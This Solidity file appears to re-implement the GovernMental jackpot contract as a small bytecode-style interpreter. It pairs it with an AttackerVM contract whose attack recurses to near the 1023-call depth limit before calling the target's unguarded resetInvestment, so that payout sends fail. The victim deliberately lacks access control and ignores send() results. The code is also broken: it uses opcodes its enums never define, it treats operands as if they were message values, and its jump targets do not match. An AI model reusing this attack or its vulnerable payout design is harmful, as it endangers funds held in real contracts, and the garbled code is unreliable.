pragma solidity ^0.4.0;

contract GovernmentalVM {
    address public owner;
    address public lastInvestor;
    uint public jackpot = 1 ether;
    uint public lastInvestmentTimestamp;
    uint public ONE_MINUTE = 1 minutes;

    enum Opcode { PUSH, POP, ADD, SUB, JMP, JZ, LOAD, STORE, SEND }

    struct Instruction {
        Opcode opcode;
        uint operand;
    }

    Instruction[] public program;
    uint public programCounter;
    uint[] public stack;

    function GovernmentalVM() {
        owner = msg.sender;
        if (msg.value < 1 ether) throw;
    }

    function invest() {
        loadProgram();
        executeProgram(msg.value, msg.sender, block.timestamp);
    }

    function resetInvestment() {
        loadProgram();
        executeProgram(0, 0, block.timestamp);
    }

    function loadProgram() internal {
        program.push(Instruction(Opcode.LOAD, 1)); // LOAD jackpot
        program.push(Instruction(Opcode.PUSH, 2)); // PUSH 2
        program.push(Instruction(Opcode.DIV, 0));  // DIV
        program.push(Instruction(Opcode.PUSH, 0)); // PUSH msg.value
        program.push(Instruction(Opcode.LT, 0));   // LT
        program.push(Instruction(Opcode.JZ, 6));   // JZ to 6
        program.push(Instruction(Opcode.PUSH, 1)); // PUSH msg.sender
        program.push(Instruction(Opcode.STORE, 2)); // STORE lastInvestor
        program.push(Instruction(Opcode.PUSH, 0)); // PUSH msg.value
        program.push(Instruction(Opcode.PUSH, 2)); // PUSH 2
        program.push(Instruction(Opcode.DIV, 0));  // DIV
        program.push(Instruction(Opcode.ADD, 1));  // ADD to jackpot
        program.push(Instruction(Opcode.PUSH, 3)); // PUSH block.timestamp
        program.push(Instruction(Opcode.STORE, 3)); // STORE lastInvestmentTimestamp
        program.push(Instruction(Opcode.LOAD, 3)); // LOAD lastInvestmentTimestamp
        program.push(Instruction(Opcode.PUSH, 4)); // PUSH ONE_MINUTE
        program.push(Instruction(Opcode.ADD, 0));  // ADD
        program.push(Instruction(Opcode.PUSH, 3)); // PUSH block.timestamp
        program.push(Instruction(Opcode.LT, 0));   // LT
        program.push(Instruction(Opcode.JZ, 21));  // JZ to 21
        program.push(Instruction(Opcode.LOAD, 2)); // LOAD lastInvestor
        program.push(Instruction(Opcode.SEND, 1)); // SEND jackpot
        program.push(Instruction(Opcode.LOAD, 0)); // LOAD owner
        program.push(Instruction(Opcode.SUB, 5));  // SUB 1 ether
        program.push(Instruction(Opcode.SEND, 0)); // SEND
        program.push(Instruction(Opcode.PUSH, 0)); // PUSH 0
        program.push(Instruction(Opcode.STORE, 2)); // STORE lastInvestor
        program.push(Instruction(Opcode.PUSH, 6)); // PUSH 1 ether
        program.push(Instruction(Opcode.STORE, 1)); // STORE jackpot
        program.push(Instruction(Opcode.PUSH, 0)); // PUSH 0
        program.push(Instruction(Opcode.STORE, 3)); // STORE lastInvestmentTimestamp
    }

    function executeProgram(uint value, address sender, uint timestamp) internal {
        programCounter = 0;
        stack.length = 0;

        while (programCounter < program.length) {
            Instruction memory instr = program[programCounter];
            programCounter++;

            if (instr.opcode == Opcode.PUSH) {
                stack.push(instr.operand);
            } else if (instr.opcode == Opcode.POP) {
                stack.length -= 1;
            } else if (instr.opcode == Opcode.ADD) {
                stack[stack.length - 2] += stack[stack.length - 1];
                stack.length -= 1;
            } else if (instr.opcode == Opcode.SUB) {
                stack[stack.length - 2] -= stack[stack.length - 1];
                stack.length -= 1;
            } else if (instr.opcode == Opcode.LOAD) {
                if (instr.operand == 0) stack.push(uint(owner));
                if (instr.operand == 1) stack.push(jackpot);
                if (instr.operand == 2) stack.push(uint(lastInvestor));
                if (instr.operand == 3) stack.push(lastInvestmentTimestamp);
                if (instr.operand == 4) stack.push(ONE_MINUTE);
                if (instr.operand == 5) stack.push(1 ether);
            } else if (instr.opcode == Opcode.STORE) {
                if (instr.operand == 1) jackpot = stack[stack.length - 1];
                if (instr.operand == 2) lastInvestor = address(stack[stack.length - 1]);
                if (instr.operand == 3) lastInvestmentTimestamp = stack[stack.length - 1];
                stack.length -= 1;
            } else if (instr.opcode == Opcode.SEND) {
                if (instr.operand == 0) owner.send(stack[stack.length - 1]);
                if (instr.operand == 1) lastInvestor.send(stack[stack.length - 1]);
                stack.length -= 1;
            } else if (instr.opcode == Opcode.JMP) {
                programCounter = instr.operand;
            } else if (instr.opcode == Opcode.JZ) {
                if (stack[stack.length - 1] == 0) programCounter = instr.operand;
                stack.length -= 1;
            }
        }
    }
}

contract AttackerVM {
    enum Opcode { PUSH, JZ, CALL, RECURSE }

    struct Instruction {
        Opcode opcode;
        uint operand;
    }

    Instruction[] public attackProgram;
    uint public attackPC;
    uint[] public attackStack;

    function attack(address target, uint count) {
        loadAttackProgram();
        executeAttackProgram(target, count);
    }

    function loadAttackProgram() internal {
        attackProgram.push(Instruction(Opcode.PUSH, 0)); // PUSH count
        attackProgram.push(Instruction(Opcode.PUSH, 1023)); // PUSH 1023
        attackProgram.push(Instruction(Opcode.LT, 0)); // LT
        attackProgram.push(Instruction(Opcode.JZ, 6)); // JZ to 6
        attackProgram.push(Instruction(Opcode.PUSH, 2000)); // PUSH 2000
        attackProgram.push(Instruction(Opcode.RECURSE, 0)); // RECURSE
        attackProgram.push(Instruction(Opcode.CALL, 0)); // CALL resetInvestment
    }

    function executeAttackProgram(address target, uint count) internal {
        attackPC = 0;
        attackStack.length = 0;

        while (attackPC < attackProgram.length) {
            Instruction memory instr = attackProgram[attackPC];
            attackPC++;

            if (instr.opcode == Opcode.PUSH) {
                attackStack.push(instr.operand);
            } else if (instr.opcode == Opcode.JZ) {
                if (attackStack[attackStack.length - 1] == 0) attackPC = instr.operand;
                attackStack.length -= 1;
            } else if (instr.opcode == Opcode.CALL) {
                GovernmentalVM(target).resetInvestment();
            } else if (instr.opcode == Opcode.RECURSE) {
                if (0 <= count && count < 1023) {
                    this.attack.gas(msg.gas - instr.operand)(target, count + 1);
                }
            }
        }
    }
}